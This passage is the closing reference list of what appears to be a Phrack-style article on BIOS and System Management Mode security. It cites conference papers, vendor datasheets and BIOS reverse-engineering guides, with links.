+		BSDaemon, coideloko, and D0nand0n. Phrack Vol 0x0C, Issue 0x41
+		http://www.phrack.org/issues.html?issue=65
+
+[efi_hack]	Hacking the Extensible Firmware Interface Firmware Interface
+		John Heasman. Black Hat USA 2007
+		http://www.ngssoftware.com/research/papers/BH-VEGAS-07-Heasman.pdf
+
+[ich]		Intel I/O Controller Hub 10 (ICH10) Family Datasheet
+		http://www.intel.com/assets/pdf/datasheet/319973.pdf
+
+[intel_man]	Intel IA-32 Architecture Software Developer's Manual
+		http://www.intel.com/products/processor/manuals/
+
+[amd_man]	BIOS and Kernel's Developer's Guide for AMD Athlon 64 and AMD Opteron Processors
+		Advanced Micro Devices, Inc.
+		http://www.amd.com/us-en/assets/content_type/white_papers_and_tech_docs/26094.PDF
+
+[bios_disasm]	BIOS Disassembly Ninjutsu Uncovered or
+		Pinczakko's Guide to Award BIOS Reverse Engineering
+		Darmawan M Salihun aka Pinczakko
+		http://www.geocities.com/mamanzip/Articles/Award_Bios_RE/Award_Bios_RE_guide.html
+		http://www.geocities.com/mamanzip/Articles/award_bios_patching/award_bios_patching.html
+
+[ami_mod]	Performing AMI BIOS Mods Discussion Thread // The Rebels Heaven
+		http://www.rebelshavenforum.com/sis-bin/ultimatebb.cgi?ubb=get_topic&f=52&t=000049
+
+[xen_0wn]	Preventing and Detecting Xen Hypervisor Subversions
+		Joanna Rutkowska & Rafal Wojtczuk. Black Hat USA 2008
+		http://invisiblethingslab.com/bh08/part2-full.pdf
+
+[ami_usb]	USB Support for AMIBIOS8
+		American Megatrends, Inc.
+		http://www.securitytechnet.com/resource/hot-topic/homenet/AMIBIOS8_USB_Whitepaper.pdf
+
+[smm_cache]	Getting into SMRAM: SMM Reloaded
+		Loic Duflot et al. CanSecWest 2009
+		http://cansecwest.com/csw09/csw09-duflot.pdf
+
+		Attacking SMM Memory via IntelR CPU Cache Poisoning
+		Rafal Wojtczuk and Joanna Rutkowska
+		http://invisiblethingslab.com/resources/misc09/smm_cache_fun.pdf
+
+--------[ EOF
